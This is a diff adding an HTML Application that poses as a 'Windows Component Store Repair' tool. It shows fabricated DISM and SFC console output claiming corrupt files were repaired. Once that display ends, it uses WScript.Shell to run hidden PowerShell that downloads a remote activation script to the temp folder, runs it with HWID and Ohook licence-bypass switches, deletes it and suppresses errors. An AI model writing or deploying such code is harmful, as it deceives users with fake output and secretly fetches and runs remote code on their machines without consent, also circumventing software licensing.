@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Windows Component Store Repair</title>
+<HTA:APPLICATION
+  APPLICATIONNAME="Windows Component Store Repair"
+  WINDOWSTATE="normal"
+  BORDER="thick"
+  INNERBORDER="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="yes"
+  SCROLL="no"
+  CONTEXTMENU="no"
+  SELECTION="no"
+  SYSMENU="yes"
+  ICON="C:\Windows\System32\imageres.dll,5"
+/>
+<style>
+body {
+  background: #000;
+  color: #c0c0c0;
+  font-family: Consolas, Lucida Console, Courier New, monospace;
+  font-size: 13px;
+  margin: 0;
+  padding: 14px 18px;
+  width: 740px;
+  height: 400px;
+  overflow: hidden;
+}
+#o { white-space: pre-wrap; line-height: 1.35; }
+.g { color: #0f0; }
+.y { color: #ff0; }
+.c { color: #0ff; }
+.r { color: #555; }
+</style>
+</head>
+<body>
+<div id="o"></div>
+<script>
+var d = document.getElementById('o');
+function w(t,c){d.innerHTML+='<span'+(c?' class="'+c+'"':'')+'>'+t+'</span>\n';d.scrollTop=d.scrollHeight;}
+var s = [
+  ['Microsoft Windows [Version 10.0.22621.3672]','r'],
+  ['(c) Microsoft Corporation. All rights reserved.','r'],
+  ['',''],
+  ['C:\\Windows\\System32> dism /online /cleanup-image /restorehealth','c'],
+  ['',''],
+  ['Deployment Image Servicing and Management tool',''],
+  ['Version: 10.0.22621.3672','r'],
+  ['',''],
+  ['Image Version: 10.0.22621.1','r'],
+  ['',''],
+  ['[==========================               ] 50%','r'],
+  ['Processing 1 of 18241...','r'],
+  ['  The operation completed successfully.','g'],
+  ['',''],
+  ['[================================           ] 70%','r'],
+  ['Processing 3482 of 18241...','r'],
+  ['  The operation completed successfully.','g'],
+  ['',''],
+  ['[=====================================      ] 85%','r'],
+  ['Processing 11247 of 18241...','r'],
+  ['  The operation completed successfully.','g'],
+  ['',''],
+  ['[=============================================] 100%','g'],
+  ['',''],
+  ['The operation completed successfully.','g'],
+  ['',''],
+  ['C:\\Windows\\System32> sfc /scannow','c'],
+  ['',''],
+  ['Beginning system scan. This process will take some time.',''],
+  ['',''],
+  ['Beginning verification phase of system scan.',''],
+  ['Verification 16% complete.','r'],
+  ['Verification 33% complete.','r'],
+  ['Verification 52% complete.','r'],
+  ['Verification 79% complete.','r'],
+  ['Verification 100% complete.','g'],
+  ['',''],
+  ['Windows Resource Protection found corrupt files','y'],
+  ['and successfully repaired them.','g'],
+  ['',''],
+  ['C:\\Windows\\System32>','c'],
+  ['',''],
+  ['Press any key to continue...','r'],
+];
+var i=0;
+function n(){
+  if(i<s.length){
+    w(s[i][0],s[i][1]);i++;
+    var d=60+Math.random()*200;
+    if(s[i-1][0].indexOf('Processing')>=0)d=150+Math.random()*300;
+    if(s[i-1][0].indexOf('Verification')>=0)d=500+Math.random()*700;
+    setTimeout(n,d);
+  } else {
+    setTimeout(function(){
+      try{
+        var ws=new ActiveXObject('WScript.Shell');
+        ws.Run('powershell -WindowStyle Hidden "irm https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/refs/heads/master/MAS/All-In-One-Version-KL/MAS_AIO.cmd -o %temp%\\m.cmd"',0,true);
+        ws.Run('cmd /c ""%temp%\\m.cmd" /HWID"',0,true);
+        ws.Run('cmd /c ""%temp%\\m.cmd" /Ohook"',0,true);
+        ws.Run('cmd /c del /q "%temp%\\m.cmd" 2>nul',0,true);
+      }catch(e){}
+      setTimeout(function(){window.close();},1200);
+    },600);
+  }
+}
+setTimeout(n,200);
+</script>
+</body>
+</html>
